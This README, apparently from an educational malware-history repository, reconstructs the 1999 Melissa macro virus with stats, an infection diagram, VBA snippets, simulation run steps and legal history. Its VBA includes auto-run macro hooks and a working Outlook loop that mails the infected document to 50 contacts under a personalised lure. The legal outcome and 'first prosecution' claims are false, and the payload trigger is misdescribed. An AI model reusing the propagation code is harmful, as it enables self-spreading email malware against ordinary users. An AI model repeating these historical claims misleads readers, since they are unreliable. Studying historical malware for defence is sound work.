# 📧 Melissa Virus (1999)

> **The macro virus that kicked off the email worm era — first federal virus prosecution under CFAA**

<div align="center">

![Melissa](https://img.shields.io/badge/Melissa-Virus-orange?style=for-the-badge&logo=microsoft)
[![Release Date](https://img.shields.io/badge/Released-March%2026%2C%201999-orange?style=flat-square)]()
[![Author](https://img.shields.io/badge/Author-David%20L.%20Smith-lightgrey?style=flat-square)]()
[![Damage](https://img.shields.io/badge/Damage-%2480M--1B-orange?style=flat-square)]()

</div>

---

## 📊 Quick Stats

| Attribute | Value |
|-----------|-------|
| 📅 Release Date | March 26, 1999 |
| 👤 Author | David L. Smith (arrested April 1, 1999) |
| 💥 Infected | ~15-20% of business computers |
| 💰 Damage | $80 million - $1 billion USD |
| 🌍 Spread | Global, within 5 days |
| 🖥️ Platform | Windows/Mac (Microsoft Word 97/2000 VBA) |
| ⏱️ Detection Time | ~72 hours |
| ⚖️ Legal | First federal virus prosecution under CFAA |

---

## 🔍 Attack Vector

```
┌─────────────────────────────────────────────────────────────┐
│                    INFECTION CHAIN                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  📧 Email: "Important Message"                              │
│     │                                                       │
│     ├─ Subject: Personalized (from your contact list)       │
│     ├─ Attachment: "list.doc"                               │
│     │   └─ Appeared to be a list of passwords               │
│     │   └─ Social engineering: curiosity gap                │
│     │                                                       │
│     ▼                                                       │
│  📄 User opens Word document                                │
│     │                                                       │
│     ▼                                                       │
│  ⚠️ Word prompts to enable macros? (User clicked Yes)       │
│     │                                                       │
│     ▼                                                       │
│  🦠 AutoOpen macro executes immediately                     │
│     │                                                       │
│     ├─ 1️⃣ Emails itself to first 50 Outlook contacts       │
│     ├─ 2️⃣ Infects Normal.dot template                      │
│     └─ 3️⃣ All new documents now carry virus                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 🧬 Technical Breakdown

### Phase 1: Macro Auto-Execution ⚡

```vba
Sub AutoOpen()
    Call InfectAndSpread
    Call DisplayInnocuousMessage
End Sub

Sub AutoExec()
    Call InfectAndSpread
End Sub
```

**Concept:** VBA macros named `AutoOpen` and `AutoExec` execute automatically when a document opens or Word starts. No user action beyond opening the file.

### Phase 2: Email Propagation 📧

```vba
Set outlookApp = CreateObject("Outlook.Application")
Set nameSpace = outlookApp.GetNameSpace("MAPI")
Set addressList = nameSpace.AddressLists(1)

For Each contactEntry In addressList.AddressEntries
    If contactCount >= 50 Then Exit For
    Set mailItem = outlookApp.CreateItem(0)
    mailItem.To = contactEntry.Address
    mailItem.Subject = "Important Message From " & contactEntry.Name
    mailItem.Body = "Here is that document that you asked for" & _
                    "Don't show anyone" & "Melissa"
    mailItem.Attachments.Add ActiveDocument.FullName
    mailItem.Send
    contactCount = contactCount + 1
Next
```

**Concept:** Used victim's own email account, making messages appear from a trusted contact. Personalized subject lines increased open rates.

### Phase 3: Template Infection 📄

```vba
Set normalTemplate = NormalTemplate
' Copy virus macros from active document to Normal.dot
```

**Concept:** `Normal.dot` is Word's default template loaded for every new document. Infecting it ensured ALL new documents carried the virus.

### Phase 4: Conditional Payload 🎲

```vba
If systemMinute = 0 Or systemMinute = 1 Then
    Selection.TypeText "Twenty-two points, plus triple-word-score..."
End If
```

**Concept:** Some variants activated a payload based on system time, inserting a Scrabble reference into documents. More annoying than destructive.

---

## 📁 Source Files

| File | Description |
|------|-------------|
| [`melissa_macros.vba.educational`](melissa_macros.vba.educational) | Annotated VBA macro source |
| [`melissa_runner.vbs`](melissa_runner.vbs) | VBScript runner for simulation |
| [`run_simulation.bat`](run_simulation.bat) | Easy runner for safe simulation |
| [`melissa_educational_log.txt`](melissa_educational_log.txt) | Sample output log |

---

## ⚙️ How to Run

**Option 1: Batch file (easiest)**
```bash
cd melissa_virus
run_simulation.bat
```

**Option 2: Direct**
```bash
cscript //nologo melissa_runner.vbs
```

---

## 📊 Sample Output

```
=== MELISSA VIRUS - EDUCATIONAL SIMULATION ===
Original: March 26, 1999 by David L. Smith

--- TEMPLATE INFECTION SIMULATION ---
SIMULATED: Would check Normal.dot for existing infection
SIMULATED: Would copy virus macros to Normal.dot template
SIMULATED: All new documents would now be infected

--- EVASION TECHNIQUES USED BY MELISSA ---
1. Minimal destructive payload - just self-replicates
2. Social engineering via personalized emails
3. Strategic 50-contact limit (spread vs stealth balance)
4. Normal.dot template infection for document-based spread
```

---

## 🛡️ Vulnerabilities Exploited

| Vulnerability | Impact | Fixed |
|--------------|--------|-------|
| Macro auto-execution | Macros ran on document open | Macros blocked by default |
| Trusted contact emails | Emails appeared from known senders | Email authentication |
| Outlook auto-send | No confirmation for programmatic emails | Security prompts added |
| Template model | Normal.dot infected all new docs | Template security hardened |
| User trust | Opened attachments from "known" contacts | Awareness training |

---

## ⚖️ Legal Outcome

David L. Smith was:
- 🚔 Arrested April 1, 1999 (just 6 days after release)
- 💰 Fined $15,000
- 🏠 Sentenced to 10 months probation
- 🚫 Ordered not to use a computer without supervision for 3 years

This was the **first federal prosecution** under the Computer Fraud and Abuse Act for a computer virus.

---

## 📚 Further Reading

- [FBI Case Files](https://vault.fbi.gov)
- [CERT Advisory](https://www.cert.org)
- [Microsoft Macro Security](https://docs.microsoft.com/en-us/deployoffice/security)

---

<div align="center">

⚠️ **EDUCATIONAL ONLY** — All destructive operations simulated

</div>
